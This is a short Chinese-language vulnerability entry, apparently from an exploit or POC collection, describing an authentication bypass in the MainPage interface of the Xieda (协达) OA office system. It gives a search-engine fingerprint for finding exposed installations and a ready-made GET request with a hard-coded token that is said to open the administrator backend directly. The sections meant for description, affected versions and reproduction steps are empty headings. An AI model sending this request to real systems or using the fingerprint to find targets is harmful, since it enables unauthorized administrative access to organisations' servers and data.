# 协达OA的MainPage接口存在绕过验证登陆漏洞

- **系统**：协达OA的MainPage接口　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="/interface/CheckLoginName.jsp"`

**请求体 / payload**
```
拼接url，get请求访问，可直接进入系统后台，管理员权限。
/stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN
```

**其他**
- 协达OA的MainPage接口存在绕过验证登陆漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 协达OA